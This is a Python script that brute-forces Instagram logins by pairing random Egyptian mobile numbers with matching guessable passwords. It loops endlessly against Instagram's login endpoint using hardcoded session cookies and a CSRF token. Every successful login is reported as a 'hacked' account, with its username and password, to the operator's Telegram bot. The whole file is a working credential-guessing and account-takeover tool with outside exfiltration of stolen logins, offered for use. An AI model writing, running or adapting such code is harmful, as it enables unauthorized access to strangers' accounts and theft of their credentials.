import random
import requests
import pyfiglet
import os
from user_agent import generate_user_agent

Z = '\033[1;31m' 
X = '\033[1;29m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m'
B = '\033[2;36m'
Y = '\033[1;34m' 

lo = pyfiglet.figlet_format('......Shouk.......')
lq = pyfiglet.figlet_format('   Mahmoud  ')
print(F+lo)
print(F+lq)
ID = input(F+' Enter ID Telegram : ')
token = input(Z+' Enter Token Bot : ')
os.system("clear")

r = requests.Session()

lo = pyfiglet.figlet_format('INSTGRAM')
print(Z+lo)

print(Z1+' ___________________________________________')
print(F+''' 
  [1] - Orange : 012
  [2] - Vodafone : 010
  [3] - We Egypt  : 015
  [4] - Etisalat : 011
  [F] - By : Amr Elsherif and Shouk mahmoud\n''')
print(X+' __________________________________________')

AS = input(' \n [⊙] Chose Number : ')

if (AS == '1'):
	user = '1234567890'
	a = '+20'
	u = '012'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(8)))
		username = a + u + us
		password = u + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F + username + password + ' Available')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ ʜɪ ѕɪʀ ɴᴇᴡ ғᴀᴄᴋᴇᴅ ⌯\n— — — — —  — — — — —\n⌯ ᴇᴍᴀɪʟ : {username}\n⌯ ᴘᴀѕѕ : {password}\n— — — — —  — — — — —\nFrom : @amrelsharif9_bot''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + '-' + password +' Not Hacking')
			
if (AS == '2'):
	user = '1234567890'
	a = '+20'
	u = '010'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(8)))
		username = a + u + us
		password = u + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F+username + password + ' Available')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ ʜɪ ѕɪʀ ɴᴇᴡ ғᴀᴄᴋᴇᴅ ⌯\n— — — — —  — — — — —\n⌯ ᴇᴍᴀɪʟ : {username}\n⌯ ᴘᴀѕѕ : {password}\n— — — — —  — — — — —\nFrom : @amrelsharif9_bot''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + '-' + password +' Not Hacking')	
			
if (AS == '3'):
	user = '1234567890'
	a = '+20'
	u = '015'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(8)))
		username = a + u + us
		password = u + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F+username + password + ' Available')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ ʜɪ ѕɪʀ ɴᴇᴡ ғᴀᴄᴋᴇᴅ ⌯\n— — — — —  — — — — —\n⌯ ᴇᴍᴀɪʟ : {username}\n⌯ ᴘᴀѕѕ : {password}\n— — — — —  — — — — —\nFrom : @amrelsharif9_bot''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + '-' + password +' Not Hacking')	
			
if (AS == '4'):
	user = '1234567890'
	a = '+20'
	u = '011'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(8)))
		username = a + u + us
		password = u + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F+username + password + ' Available')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ ʜɪ ѕɪʀ ɴᴇᴡ ғᴀᴄᴋᴇᴅ ⌯\n— — — — —  — — — — —\n⌯ ᴇᴍᴀɪʟ : {username}\n⌯ ᴘᴀѕѕ : {password}\n— — — — —  — — — — —\nFrom : @amrelsharif9_bot''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + '-' + password +' Not Hacking')	
#code By : Amr Elsherif
# ال Script ده ل احلى واحدة شافتها عينيه 
# بحبك يا شوق
			
